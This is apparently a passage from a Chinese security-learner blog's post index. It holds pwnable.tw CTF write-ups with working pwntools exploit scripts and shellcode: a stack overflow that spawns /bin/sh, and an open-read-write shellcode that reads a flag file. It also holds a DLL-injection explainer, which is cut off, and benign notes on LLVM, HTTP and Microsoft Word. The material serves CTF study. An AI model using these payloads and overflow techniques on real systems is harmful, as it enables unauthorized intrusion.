&#123;&#125;;</span></span><br><span class="line"><span class="string">push &#123;&#125;;</span></span><br><span class="line"><span class="string">mov ebx,esp;</span></span><br><span class="line"><span class="string">xor ecx,ecx;</span></span><br><span class="line"><span class="string">xor edx,edx;</span></span><br><span class="line"><span class="string">xor eax,eax;</span></span><br><span class="line"><span class="string">mov al,0x5;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">mov ebx,eax;</span></span><br><span class="line"><span class="string">xor eax,eax;</span></span><br><span class="line"><span class="string">mov al,0x3;</span></span><br><span class="line"><span class="string">mov ecx,esp;</span></span><br><span class="line"><span class="string">mov dl,0x30;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">mov al,0x4;</span></span><br><span class="line"><span class="string">mov bl,1;</span></span><br><span class="line"><span class="string">mov dl,0x30;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">'''</span>.format(hex(u32(<span class="string">'ag'</span>+chr(<span class="number">0</span>)+chr(<span class="number">0</span>))),hex(u32(<span class="string">'w/fl'</span>)),hex(u32(<span class="string">'e/or'</span>)),hex(u32(<span class="string">'/hom'</span>)))</span><br><span class="line"></span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable.tw </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.tw-start-栈溢出执行shellcode</title>
      <link href="2020/10/18/pwnable-tw-start-%E6%A0%88%E6%BA%A2%E5%87%BA%E6%89%A7%E8%A1%8Cshellcode/"/>
      <url>2020/10/18/pwnable-tw-start-%E6%A0%88%E6%BA%A2%E5%87%BA%E6%89%A7%E8%A1%8Cshellcode/</url>
      
        <content type="html"><![CDATA[<p>是一道基础的栈溢出</p><p>题目会用int 80给一个输出，然后会允许你进行输入，输入可以直接完成栈溢出</p><p>（int 80中eax寄存器内存放的是操作数，4为输出，3为输入</p><p>思路是用输出leak出esp的地址，然后执行存放在栈内的shellcode</p><p>ROP直接跳转到 0x08048087 ，可以通过输出泄露出esp此时的地址</p><p>需要注意的是，这里获得的输出并不是当前的栈顶，相比于正常的函数调用，少了一个 pop esp的过程</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-start-1.png"  alt=""></p><p>所以我们需要对获得的 esp_addr - 0x4 才是真正的栈顶</p><p>所以 shellcode_addr = esp_addr - 0x4 + 0x18 = esp_addr + 0x14</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10000</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x14</span> + p32(<span class="number">0x08048087</span>)</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">addr = u32(p.recv(<span class="number">4</span>))+<span class="number">0x14</span></span><br><span class="line">shellcode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x14</span> + p32(addr) + shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable.tw </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识llvm</title>
      <link href="2020/07/16/%E5%88%9D%E8%AF%86llvm/"/>
      <url>2020/07/16/%E5%88%9D%E8%AF%86llvm/</url>
      
        <content type="html"><![CDATA[<p>最近需要使用bitcode所以来了解一下llvm</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>LLVM是构架编译器(compiler)的框架系统，以C++编写而成，用于优化以任意程序语言编写的程序的编译时间(compile-time)、链接时间(link-time)、运行时间(run-time)以及空闲时间(idle-time)，对开发者保持开放，并兼容已有脚本。</p><h2 id="Clang"><a href="#Clang" class="headerlink" title="Clang"></a>Clang</h2><p>Clang是一个C++编写、基于LLVM、发布于LLVM BSD许可证下的C/C++/Objective-C/Objective-C++编译器。</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/llvm-1.png"  alt=""></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>安装cmake</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install cmake</span><br></pre></td></tr></table></figure><p>参考：<a href="https://blog.csdn.net/fengzhongluoleidehua/article/details/95449759" target="_blank" rel="noopener">llvm+clang安装</a></p><p>注意sudo make -j 8，8指的是内核数，想要用几个改成几个即可，比如我是单核虚拟机，就改成1</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -emit-llvm -o double.bc -c double.c</span><br></pre></td></tr></table></figure><h2 id="bitcode"><a href="#bitcode" class="headerlink" title="bitcode"></a>bitcode</h2><p>Bitcode是LLVM编译器的中间代码的一种编码,LLVM的前端可以理解为C/C++/OC/Swift等编程语言,LLVM的后端可以理解为各个芯片平台上的汇编指令或者可执行机器指令数据,那么,BitCode就是位于这两者直接的中间码.</p><h2 id="wllvm"><a href="#wllvm" class="headerlink" title="wllvm"></a>wllvm</h2><p>wllvm是对llvm的封装，可以把代码编译成binary的同时，给binary附加一个bitcode段</p><p>安装参考<a href="https://blog.csdn.net/xjtu_czh/article/details/51896637" target="_blank" rel="noopener">https://blog.csdn.net/xjtu_czh/article/details/51896637</a></p>]]></content>
      
      
      <categories>
          
          <category> llvm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> llvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web基础-HTTP</title>
      <link href="2020/05/23/web%E5%9F%BA%E7%A1%80-HTTP/"/>
      <url>2020/05/23/web%E5%9F%BA%E7%A1%80-HTTP/</url>
      
        <content type="html"><![CDATA[<p>忙完了学校乱七八糟的事终于又有时间学东西了，嘻嘻。（啊下个月就是考试月了，wsl</p><p>最近捡起了web，这里就记录一下web的http基础知识</p><p>写完才发现这里有个详细的整理<a href="https://www.cnblogs.com/lauhp/p/8979393.html" target="_blank" rel="noopener">http</a></p><h2 id="HTTP请求"><a href="#HTTP请求" class="headerlink" title="HTTP请求"></a>HTTP请求</h2><h3 id="GET和POST"><a href="#GET和POST" class="headerlink" title="GET和POST"></a>GET和POST</h3><ol><li>get直接在浏览器输入，post需要工具发送请求</li><li>get用url或者cookie传参，post将数据放在body中</li><li>get的URL有长度限制，post数据可以非常大</li><li>post比get安全，因为URL看不到数据</li><li>get用来获取数据，post用来发送数据</li></ol><h3 id="HEAD"><a href="#HEAD" class="headerlink" title="HEAD"></a>HEAD</h3><p>HEAD方法与GET类似，但是HEAD并不返回消息体。在一个HEAD请求的消息响应中，HTTP投中包含的元信息应该和一个GET请求的响应消息相同。</p><h4 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h4><p>特别适用在优先的速度和带宽下 </p><ol><li>检查资源的有效性。 </li><li>检查超链接的有效性。</li><li>检查网页是否被串改</li><li>多用于自动搜索机器人获取网页的标志信息，获取rss种子信息，或者传递安全认证信息等。</li></ol><h2 id="HTTP数据包"><a href="#HTTP数据包" class="headerlink" title="HTTP数据包"></a>HTTP数据包</h2><h3 id="包含"><a href="#包含" class="headerlink" title="包含"></a>包含</h3><p>1.请求行：请求类型/请求资源路径、协议的版本和类型</p><p>2.请求头：一些键值对，一般由w3c定义，浏览器与web服务器之间都可以发送，表示特定的某种含义</p><p>3.【空行】请求头与请求体之间用一个空行隔开；</p><p>4.请求体：要发送的数据(一般post方式会使用)；例：userName=123&amp;password=123&amp;returnUrl=/</p><h3 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h3><p>eg：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Request Headers</span></span><br><span class="line"></span><br><span class="line">POST /adduser HTTP/<span class="number">1.1</span></span><br><span class="line">Host: localhost:<span class="number">8030</span></span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: <span class="number">16</span></span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Origin: chrome-extension://fdmmgilgnpjigdojojpjoooidkmcomcm</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">6.1</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">66.0</span><span class="number">.3359</span><span class="number">.181</span> Safari/<span class="number">537.36</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Form Data</span></span><br><span class="line"></span><br><span class="line">name=name&amp;age=<span class="number">11</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Accept：指浏览器或其他客户可以接爱的MIME文件格式。Servlet可以根据它判断并返回适当的文件格式。</span><br><span class="line"></span><br><span class="line">User-Agent：是客户浏览器名称</span><br><span class="line"></span><br><span class="line">Host：对应网址URL中的Web名称和端口号。</span><br><span class="line"></span><br><span class="line">Accept-Langeuage：指出浏览器可以接受的语言种类，如en或en-us，指英语。</span><br><span class="line"></span><br><span class="line">connection：用来告诉服务器是否可以维持固定的HTTP连接。http是无连接的，HTTP/<span class="number">1.1</span>使用Keep-Alive为默认值，这样，当浏览器需要多个文件时(比如一个HTML文件和相关的图形文件)，不需要每次都建立连接</span><br><span class="line"></span><br><span class="line">Cookie：浏览器用这个属性向服务器发送Cookie。Cookie是在浏览器中寄存的小型数据体，它可以记载和服务器相关的用户信息，也可以用来实现会话功能。</span><br><span class="line"></span><br><span class="line">Referer：表明产生请求的网页URL。如比从网页/icconcept/index.jsp中点击一个链接到网页/icwork/search，在向服务器发送的GET/icwork/search中的请求中，Referer是http://hostname:<span class="number">8080</span>/icconcept/index.jsp。这个属性可以用来跟踪Web请求是从什么网站来的。</span><br><span class="line"></span><br><span class="line">Content-Type：用来表名request的内容类型。可以用HttpServletRequest的getContentType()方法取得。</span><br><span class="line"></span><br><span class="line">Accept-Charset：指出浏览器可以接受的字符编码。英文浏览器的默认值是ISO<span class="number">-8859</span><span class="number">-1.</span></span><br><span class="line"></span><br><span class="line">Accept-Encoding：指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加速文件传递速度。浏览器在接收到Web响应之后先解码，然后再检查文件格式。</span><br></pre></td></tr></table></figure><h2 id="HTTP状态码"><a href="#HTTP状态码" class="headerlink" title="HTTP状态码"></a>HTTP状态码</h2><p>1**：提示信息-表示请求已收到，继续处理</p><p>2**：发送成功（200）</p><p>3**：重定向（302）</p><p>4**：客户端错误</p><p>　　400.发送请求有语法错误</p><p>　　401.访问页面没有授权</p><p>　　403.没有权限访问该页面</p><p>　　404.没有该页面</p><p>5**：服务端错误</p><p>　　500.服务器内部异常</p><p>　　504.服务器请求超时，没有返回结果</p><h2 id="cookie与session"><a href="#cookie与session" class="headerlink" title="cookie与session"></a>cookie与session</h2><p>贴俩链接吧</p><p><a href="https://www.cnblogs.com/bq-med/p/8603664.html" target="_blank" rel="noopener">cookie</a></p><p><a href="https://www.cnblogs.com/lansetiankongblog/p/10833485.html" target="_blank" rel="noopener">session</a></p><h3 id="cookie特点"><a href="#cookie特点" class="headerlink" title="cookie特点"></a>cookie特点</h3><ol><li>cookie是一门客户端缓存技术</li><li>cookie数据由服务器生成，发送给浏览器保存</li><li>cookie数据的格式：键值对</li><li>cookie数据过期机制：设置expire值</li></ol><p>cookie是一门客户端技术，一般是由服务器生成返回给浏览器客户端来保存的，并且cookie是以键值对的形式保存在浏览器客户端的，每一个cookie都会有名称，值，过期时间…。</p><h3 id="session特点"><a href="#session特点" class="headerlink" title="session特点"></a>session特点</h3><ol><li>session是一门服务端会话缓存技术。</li><li>session由服务器端的web容器创建，保存在服务器端。</li><li>session保存数据：键值对形式</li><li>session过期：默认30分钟</li></ol><p>session是服务端的会话技术，当用户登录了系统，服务器端的web容器就会创建一个会话，此会话中可以保存登录用户的信息，并且也是以键值对的形式去保存的，现在大部分系统都是使用的session技术来做的鉴权（权限鉴定），即：当用户登录完了才可以访问系统中的一些页面和数据。</p><h2 id="token"><a href="#token" class="headerlink" title="token"></a>token</h2><p>app项目为例：<br>一般app项目都会基于一个token做鉴权。<br>因为此时客户端不是浏览器，因此就没有cookie这一说了。<br>当用户登录app时，服务器会响应回来一个token信息（一般都是返回的一串唯一的标识符，比如说uuid或其他）。<br>服务器端会将登录用户跟token（票据）保存一个映射关系，一般保存在redis或者表里面，服务器端响应回来的token会缓存在手机<br>的本地缓存里，后面手机去访问app的其他页面，就会带着这个token去服务器做验证，如果通过这个token能够从redis找到登录用户信息<br>那么就认为你是已经登录了的用户。</p><p>token失效：<br>一段时间后，服务器端的token失效了，那么就会把此token跟用户的映射关系从redis里删掉，那么后面再来访问的时候，根据你手机请求带来的token就匹配不上登录用户了，服务器就告诉客户端，需要去做重新登录了。</p><h2 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h2><p>Referer是HTTP请求Header的一部分，当浏览器向Web服务器发送请求的时候，请求头信息一般需要包含Referer。该Referer会告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。</p><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ol><li>防盗链<br>比如办事通服务器只允许网站访问自己的静态资源，那服务器每次都需要判断Referer的值是否是zwfw.yn.gov.cn，如果是就继续访问，不是就拦截。</li><li>防止恶意请求<br>比如静态请求是*.html结尾的，动态请求是*.shtml，那么所有的*.shtml请求，必须 Referer为我自己的网站才可以访问，这就是Referer的作用。</li></ol><h3 id="空Referer"><a href="#空Referer" class="headerlink" title="空Referer"></a>空Referer</h3><p>空Referer是指Referer头部的内容为空，或者，一个HTTP 请求头中根本不包含Referer，那么什么时候HTTP请求会不包含Referer字段呢？<br>根据Referer的定义，它的作用是指示一个请求是从哪里链接过来，那么当一个请求并不是由链接触发产生的，那么自然也就不需要指定这个请求的链接来源。</p><p>比如，直接在浏览器的地址栏中输入一个资源的URL地址，那么这种请求是不会包含Referer字段的，因为这是一个“凭空产生”的HTTP请求，并不是从一个地方链接过去的。</p><p>允许Referer为空，意味着你允许比如浏览器直接访问，就是空</p><h2 id="X-Forwarded-For"><a href="#X-Forwarded-For" class="headerlink" title="X-Forwarded-For"></a>X-Forwarded-For</h2><p>X-Forwarded-For 是一个扩展头。HTTP/1.1（RFC 2616）协议并没有对它的定义，它最开始是由 Squid 这个缓存代理软件引入，用来表示 HTTP 请求端真实 IP，现在已经成为事实上的标准，被各大 HTTP 代理、负载均衡等转发服务广泛使用，并被写入 RFC 7239（Forwarded HTTP Extension）标准之中。</p><p><a href="https://imququ.com/post/x-forwarded-for-header-in-http.html" target="_blank" rel="noopener">X-Forwarded-For</a></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Microsoft-Word的使用（二）</title>
      <link href="2020/05/08/Microsoft-Word%E7%9A%84%E4%BD%BF%E7%94%A8%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>2020/05/08/Microsoft-Word%E7%9A%84%E4%BD%BF%E7%94%A8%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><p>word的表格功能也很不错，主要用于辅助排版和自定义表格的制作</p><h3 id="排版"><a href="#排版" class="headerlink" title="排版"></a>排版</h3><ol><li>word中出现中英文字体混排或是中文和数字混合的文档时，很容易对不齐，这个时候就可以用表格进行操作（表格的框线可以设置成“无”）。</li><li>可以在插入里面选择表格，也可以选中文字后选择 将文本转化为表格，如果嫌手动排版麻烦，还可以选中表格后，在上方的 布局 选择 自动调整 。</li><li>若要设置框线，可以右键-边框和底纹，就可以进行设置或者转化为无了（设置成无后，显示的虚线是预览效果，打印的时候并不会出现）。</li></ol><h3 id="制作表格"><a href="#制作表格" class="headerlink" title="制作表格"></a>制作表格</h3><ol><li>一大段信息可以在将文字转换为表格中的选择列数及文字分隔位置来快速整理为表格。</li><li>选中然后右键插入来快速添加行列。</li><li>可以在表格里的设计选择模版迅速美化表格。</li><li>选择表格-布局-重复标题行来为每页表格都设置标题行。</li><li>word的表格也可以进行计算，在布局-公式按钮中设置即可。</li></ol><h2 id="窗体"><a href="#窗体" class="headerlink" title="窗体"></a>窗体</h2><p>在需要让他人填写文档的时候，利用窗体可以实现哪些地方允许填写，填写的格式等。</p><p>首先要在设置里面的功能区和工具栏内把<strong>开发工具</strong>显示出来。</p><p>选定需要设置的地方后，在开发工具内选择文本框，若要进一步进行设置，在灰色区域中双击左键即可。</p><p>同理，复选框和组合框也可以这样进行设置。</p><p>设置完毕后，选择 <strong>保护表单</strong>（windows中为限制编辑），即可体验之前设置好的限制了。<br>或者可以在审阅-保护-保护文档中进行更具体的设置。<br>文档进行保护以后，文档编辑是被禁止的，除了填写窗体外，其他区域禁止复制，禁止触碰（此时说的是只能填写窗体的状态，其他的例如只读，文档是可以被复制的）。</p><p>同时，在审阅-保护-保护文档中可以设置密码，设置后，选择停止保护时，就会要求输入密码。</p><h2 id="模版"><a href="#模版" class="headerlink" title="模版"></a>模版</h2><p>可以在文件-根据模版新建中，选择需要的模版，同时可以方便的更换文字及图片。</p><h3 id="设定自己的模版"><a href="#设定自己的模版" class="headerlink" title="设定自己的模版"></a>设定自己的模版</h3><ol><li>排版，设定页眉</li><li>设定样式</li><li>文件-另存为模版即可</li></ol><h3 id="使用自己的模版"><a href="#使用自己的模版" class="headerlink" title="使用自己的模版"></a>使用自己的模版</h3><p>在文件-根据模版新建中选择个人，即可看到自己的模版，同时也可以将文档发给别人。</p><h2 id="SmartArt"><a href="#SmartArt" class="headerlink" title="SmartArt"></a>SmartArt</h2><p>插入-SmartArt，就可以进行选择了，用于直接美观地绘制各种有关联的关系图。</p><p>具体的设置旁边都有，十分清晰易懂，这里就不赘述了。</p><h2 id="批注和修订"><a href="#批注和修订" class="headerlink" title="批注和修订"></a>批注和修订</h2><p>批注：审阅-新建批注即可。</p><p>批注和修订是阅读者对文档进行的，作者可以选择接不接受，以及可以进行回复等操作。</p><p>进行修订后，我们可以方便地查看修改后及修改前是什么状态。</p><p>可以在审阅-保护-保护文档中选择修订，同时设置密码，这样文档就处于自动修订状态了，可以方便得看到别人的操作。</p><p>也可以设置别人只能使用批注功能。</p><p>审阅-比较文档-比较可以方便的查看两份文档的不同，而合并功能则可以将多位作者的批注合并到一个文档中。</p><h2 id="邮件"><a href="#邮件" class="headerlink" title="邮件"></a>邮件</h2><p>在邮件功能区的选择收件人中可以轻松利用表格进行批量操作。</p><p>例如选择需要操作的文字，选择插入和合并域，就可以实现给每个人的文字不一样，在预览结果中可以看到每个人实际收到的图片情况。</p><p>在完成并合并中可以预览或者打印所有的文档。（制作席卡也可以使用这种方法）</p><p>邮件群发功能需要使用微软的outlook来实现。</p><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><h3 id="数学公式"><a href="#数学公式" class="headerlink" title="数学公式"></a>数学公式</h3><p>插入-公式-插入新公式</p><h3 id="线条和公文"><a href="#线条和公文" class="headerlink" title="线条和公文"></a>线条和公文</h3><p>在行的最前方输入三个减号然后回车可以方便的出现一条横线（双横线是三个等号，波浪线是三个～，三条线中间粗是三个#，装订线是三个*），原理是自动更正里的框线。</p><p>要修改线条应该选中线条上方的段落标记，然后在开始中边框和底纹进行更改，然后点击预览中的线即可。</p><p>利用开始功能区的中文版式<br><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/word-4.png"  alt=""><br>可以进行双行合一等操作。</p><h3 id="拼音"><a href="#拼音" class="headerlink" title="拼音"></a>拼音</h3><p>选中文字后利用开始功能区中的拼音指南命令可以方便的加入拼音。（需要微软拼音输入法作支持）</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/word-5.png"  alt=""></p><p>也可以利用模版自己制作字帖。</p>]]></content>
      
      
      <categories>
          
          <category> 办公 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 办公 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Microsoft-Word的使用（一）</title>
      <link href="2020/05/02/Microsoft-Word%E7%9A%84%E4%BD%BF%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>2020/05/02/Microsoft-Word%E7%9A%84%E4%BD%BF%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>最近在学办公软件的操作，感觉对日常生活还挺有帮助的，属于那种受用终身的技能，毕竟学校琐事实在是太多了…</p><h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><ol><li>想要快速在文档某个地方进行输入，双击鼠标即可，同时可以避免影响后文的尴尬。</li><li>快速调整字号，放大为cmd+]  (mac环境下，同时需要注意此时需为英文输入法) 。</li><li>shift + F3 可以进行全大写/全小写/句首大写的切换。</li><li>输入®的快捷方式是输入(r)，同理可得©，原理是这些东西被设定了自动更正，同时，如果需要重复输入某复杂名称，也可以自己设定自动替换。</li><li>设定编号后，按回车会自动到下一编号，因为回车是换段的意思，想要继续在该编号中写入文字，shift + enter即可，这时是换行的意思。</li><li>重复前一次操作的快捷键是<strong>F4</strong>键。</li></ol><h2 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h2><ol><li>替换也可以批量替换字体格式等，只需要设置一下即可。</li><li>批量替换标题，可以查找标题中都有的文字，然后选择替换为样式-标题一，这样可以方便的替换，同时在引用里导出自动目录也可以方便的进行定位。</li><li>快速整理文档可以首先替换删除掉所有空格，再可将两个段落标记替换为一个段落标记（可能需要多次替换）。</li><li>用通配符进行替换：<br>eg：将所有手机号的中间四位替换为<em>，可以首先选择使用通配符，然后将(1??)(????)(???)替换为\1***</em>\3即可。</li></ol><h2 id="样式"><a href="#样式" class="headerlink" title="样式"></a>样式</h2><ol><li>双击格式刷可以实现例如标题快速修改格式。</li><li>使用样式可以快捷的统一修改格式。</li><li>可以使用替换将特定的文字/拥有特定字体的文字统一转换为样式。</li><li>可以选择文本，然后在样式窗格中点击选择（mac中为全选），即可将类似的文字全部选择，一次性进行修改。</li><li>设置标题样式后可以使用导航窗格实现迅速定位与快速排版。</li></ol><h2 id="排版"><a href="#排版" class="headerlink" title="排版"></a>排版</h2><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ol><li>可以使用引用-目录里的自动目录快速生成，并可以自动定位。</li><li>在目录里可以方便的进行修改标题字体。</li><li>想要另起一页可以使用插入-分页功能进行解决。</li></ol><h3 id="节"><a href="#节" class="headerlink" title="节"></a>节</h3><p>节是word中最大的单位。在没有进行分节的时候，整篇文档就是一节。（字、行、段、页、节）</p><ol><li>在布局-分隔符中可以进行分节。</li></ol><h3 id="页眉和页脚"><a href="#页眉和页脚" class="headerlink" title="页眉和页脚"></a>页眉和页脚</h3><ol><li>使用分节可以方便的调整页码，在页脚的设定中，关闭“链接到上一节”，即可在需要的地方新设置页码。在页码-设定页码格式中设置起始页码为1，然后再页码-页码中设定格式即可看到页码。关闭页眉和页脚后，在目录里右键-更新域，即可更新页码。</li><li>设置页眉方法也类似，取消掉链接后设置即可。</li><li>标题前面的黑点可以通过取消段落标记让其消失。</li><li>页眉的横线可以通过选择页眉的段落标记，将开始中的边框设置成无边框即可。<img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/word-1.png"  alt=""></li><li>想要删除分页和分节，可以通过点击开始功能区内的显示/隐藏编辑标记<img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/word-2.png"  alt=""><br>然后把光标放到前面，删除即可（mac下需要fn+delete）</li><li>把每一章都进行分节，可以方便的设置页眉为每一章的标题（即标题一样式），选择页眉和页脚-域-StyleRef-标题一，确定即可。</li><li>可以选择首页不同/奇偶数页不同对页眉和页脚进行进一步的设置。</li></ol><h2 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h2><ol><li>可以通过插入封面图片快速让文档美观。</li><li>在页眉中也可以选择插入图片来设置背景，插入后在位置中选择“衬于文字下方”，再拉伸调整即可，同时还可以设置图片的颜色，用于搭配整体色调。</li></ol><h2 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h2><ol><li>公文标准是上边距为3.7厘米，下边距为3.5厘米，左右边距为2.6厘米。</li><li>公文行间距是固定值28磅和1.5倍行距，其它的非公文文档可以设置26磅。</li><li>一定要边输入边设置样式与分节</li><li>单面打印与双面打印<br><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/word-3.jpeg"  alt=""></li><li>水印可以通过设计-水印来进行设置，也可以通过页眉进行设置（水印的实质是页眉中的“艺术字”）</li><li>通过全选文档，再点击开始功能区-清除格式（左上角的橡皮擦）即可方便的统一规划格式。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 办公 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 办公 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DLL注入</title>
      <link href="2020/04/29/DLL%E6%B3%A8%E5%85%A5/"/>
      <url>2020/04/29/DLL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h1><h2 id="消息钩取"><a href="#消息钩取" class="headerlink" title="消息钩取"></a>消息钩取</h2><h3 id="常规的Windows消息流"><a href="#常规的Windows消息流" class="headerlink" title="常规的Windows消息流"></a>常规的Windows消息流</h3><p>1.发生键盘输入事件时，WM_KEYDOWN消息被添加到[OS message queue]。</p><p>2.OS判断哪个应用程序中发生了事件，然后从[OS message queue]取出消息，添加到相应应用程序的[application message queue]中。</p><p>3.应用程序（如记事本）监视自身的[application message queue]，发现新添加的WM_KEYDOWN消息后，调用相应的事件处理程序处理。</p><h3 id="SetWindowsHookEx"><a href="#SetWindowsHookEx" class="headerlink" title="SetWindowsHookEx()"></a>SetWindowsHookEx()</h3><p>使用SetWindowsHookEx()API可以很简单的实现消息钩子，定义如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HHOOK SetWindowsHookEx(</span><br><span class="line">  int idHook,       &#x2F;&#x2F;hook type</span><br><span class="line">  HOOKPROC lpfn,    &#x2F;&#x2F;hook procedure</span><br><span class="line">  HINSTANCE hMod,   &#x2F;&#x2F;hook procedure所属的DLL句柄（Handle）</span><br><span class="line">  DWORD dwThreaId,  &#x2F;&#x2F;想要挂钩的线程ID</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>Tips:若dwThreaId设置为0，则安装的钩子为“全局钩子”（Global Hook）它会影响到运行中的（以及以后要运行的）所有进程。</p><h2 id="DLL注入-1"><a href="#DLL注入-1" class="headerlink" title="DLL注入"></a>DLL注入</h2><p>DLL注入的原理是从外部促使目标进程调用LoadLibrary()API（与一般DLL加载相同）</p><h3 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h3><p>1、创建远程线程（CreateRemoteThread()API）</p><p>2、使用注册表（AppInit_DLLs值）</p><p>3、消息钩取（SetWindowsHookEx()API）</p><p>调试时可以利用OD的各种断点功能</p><h3 id="DLL卸载"><a href="#DLL卸载" class="headerlink" 